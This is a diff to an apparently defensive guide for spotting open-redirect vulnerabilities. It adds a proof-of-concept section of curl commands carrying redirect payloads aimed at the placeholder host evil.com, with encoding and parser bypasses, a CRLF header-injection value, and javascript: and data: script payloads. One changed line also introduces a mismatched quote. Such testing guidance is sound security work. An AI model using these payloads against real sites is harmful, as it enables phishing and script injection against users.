@@ -158,9 +158,38 @@ match\s*\(\s*["']\^/
 - **SAFE**: `if (in_array($_GET['url'], $allowedUrls)) header("Location: " . $_GET['url'])`
 - **SAFE**: `header("Location: /dashboard")` — hardcoded
 
+## Dynamic Test / PoC
+
+Replace `PARAM` with the discovered redirect parameter (`url`, `redirect`, `next`, `returnTo`, `redirect_uri`, …). Inspect `Location` in response headers (`curl -s -D-`).
+
+```bash
+curl -s -D- 'https://TARGET/redirect?PARAM=https://evil.com'
+curl -s -D- 'https://TARGET/redirect?PARAM=//evil.com'
+curl -s -D- 'https://TARGET/redirect?PARAM=https%3A%2F%2Fevil.com'
+curl -s -D- 'https://TARGET/redirect?PARAM=https://evil.com%40TARGET'
+curl -s -D- 'https://TARGET/redirect?PARAM=https://TARGET%40evil.com'
+curl -s -D- 'https://TARGET/redirect?PARAM=https://TARGET.evil.com'
+curl -s -D- 'https://TARGET/redirect?PARAM=https://evil.com%23.TARGET'
+curl -s -D- 'https://TARGET/redirect?PARAM=https://%65%76%69%6c.com'
+curl -s -D- 'https://TARGET/redirect?PARAM=https://evil.com%00.TARGET'
+curl -s -D- 'https://TARGET/redirect?PARAM=%0d%0aLocation:%20https://evil.com'
+curl -s -D- 'https://TARGET/redirect?PARAM=javascript:alert(document.domain)'
+curl -s -D- 'https://TARGET/redirect?PARAM=data:text/html,<script>alert(1)</script>'
+```
+
+**Scheme/parser bypasses** when host allowlist blocks bare `https://evil.com`:
+
+```bash
+curl -s -D- 'https://TARGET/redirect?PARAM=https:evil.com'
+curl -s -D- 'https://TARGET/redirect?PARAM=/\evil.com'
+curl -s -D- 'https://TARGET/redirect?PARAM=//trusted.example/path/../@evil.com'
+```
+
+Confirmed when `Location` (or meta-refresh / client `location.assign`) resolves off-origin to an attacker-controlled host.
+
 ## Common False Alarms
 
-- Redirect target is a hardcoded constant or framework-generated route (e.g., `url_for()`, `redirect('/')`)
+- Redirect target is a hardcoded constant or framework-generated route (e.g., `url_for()`, `redirect('/')')
 - URL is fully parsed and both scheme and host are verified against an explicit allowlist before the redirect
 - Redirect is to a relative path that is prepended with a known base URL server-side
 - Login redirect that only accepts relative paths starting with `/` AND rejects protocol-relative URLs (`//evil.com`)
